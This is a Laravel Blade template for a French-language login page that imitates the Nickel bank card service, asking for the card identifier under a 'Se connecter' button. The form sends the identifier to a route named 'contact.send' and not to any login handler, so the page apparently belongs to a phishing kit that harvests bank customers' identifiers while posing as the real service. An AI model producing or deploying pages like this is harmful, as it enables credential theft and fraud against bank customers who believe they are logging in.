@extends('layouts.app')

@section('title', 'Connexion à mon espace')

@section('content')
<div class="d-flex justify-content-center align-items-center">
    <div class="text-center" style="max-width: 400px; width: 100%;">
        <p class="mb-4">
            Votre identifiant se trouve au verso de votre carte Nickel.
            Si vous avez perdu votre carte, envoyez par SMS
            <strong>IDENTIFIANT</strong> au <strong>38063</strong>.
        </p>
        <div class="mb-4">
            <img src="{{ asset('assets/images/card-placeholder.jpg') }}" alt="Carte Nickel" class="img-fluid mx-auto d-block">
        </div>

        <form action="{{ route('contact.send') }}" method="POST">
            @csrf
            <div class="mb-3 text-center">
                <label class="form-label mb-1">Identifiant (au dos de la carte)</label>
                <input type="tel" name="phone" class="form-control rounded-pill text-center"
                       placeholder="XXX-000-000-0" required>
            </div>
            <div class="form-check mb-3 d-flex align-items-center gap-4">
                <input type="checkbox" class="form-check-input" id="remember">
                <label class="form-check-label" for="remember">Mémoriser mon identifiant</label>
            </div>
            <button type="submit" class="btn btn-orange rounded-pill px-4 mx-auto d-block">Se connecter</button>
        </form>
    </div>
</div>
@endsection
